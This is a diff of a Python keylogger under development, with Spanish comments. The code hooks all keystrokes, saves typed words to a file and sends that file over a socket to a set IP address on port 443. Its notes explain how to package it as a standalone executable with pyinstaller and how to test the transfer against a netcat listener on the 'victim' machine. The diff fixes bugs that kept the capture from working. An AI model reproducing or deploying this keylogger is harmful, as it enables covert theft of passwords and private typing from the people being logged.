@@ -4,10 +4,10 @@ import socket
 import os
 # import datetime  # Deseable si quiero saber cuando las pulsó
 
-# SE DEBEN INSTALAR LOS PAQUETES MEDIANTE UN ENTORNO VIRTUAL
-
 """ 
 NOTAS IMPORTANTES
+
+SE DEBEN INSTALAR LOS PAQUETES MEDIANTE UN ENTORNO VIRTUAL
 
 Al desarrollar este programa dentro de un wsl, windows no permite que este tengo acceso a lo que se teclea en windows
 y puede dar problemas.
@@ -16,21 +16,25 @@ Si se estuviera en ubuntu, al hacer uso de keyboard, que accede a carpetas de ha
 habría que probar a meterlo en el grupo input con -> sudo usermod -aG input user
 
 Para crear el ejecutable basta con instalar el módulo pyinstaller y ejecutar pyinstaller -onefile ./keylogger.py
+
+Testear primero las ip a las que se envian las cosas y dentro de la máquina "victima" tener un netcat escuchando
+Si se deja la ip de esta máquina el fichero se mandará al repo directamente
 """
 
 print ("KEYLOGGER")
 
 # Función que regista en una variable global las palabras pulsadas
+palabra = ""
+
 def pulsación_tecla(tecla_pulsada):
     global palabra
-
     # If que detecta cuando una tecla a sido pulsada
     if tecla_pulsada.event_type == keyboard.KEY_DOWN:
         # Se llama a la funcion de guardado de palabra si se pulsan ciertas teclas
         if tecla_pulsada.name == 'space' or tecla_pulsada.name == 'enter':
             guardar_palabra(tecla_pulsada.name)
-        elif len(tecla_pulsada.name) == 1 and pulsación_tecla.name.isprintable():
-            palabra += pulsación_tecla.name
+        elif len(tecla_pulsada.name) == 1:
+            palabra += tecla_pulsada.name
 
 keyboard.hook(pulsación_tecla)
 
@@ -38,7 +42,6 @@ def guardar_palabra(tecla_pulsada):
     match (tecla_pulsada):
         case 'space':
             with open('palabras.txt', 'a') as file:
-                global palabra
                 file.write(palabra + '\n')
                 reset_palabra()
 
@@ -64,7 +67,7 @@ def detener_script():
     enviar_archivo_sockets(fichero_mensaje, direccion_ip_destino, puerto_destino)
 
 
-direccion_ip_destino = '0.0.0.0'
+direccion_ip_destino = '192.168.1.37'
 puerto_destino = '443'
 fichero_mensaje = 'palabras.txt'
 
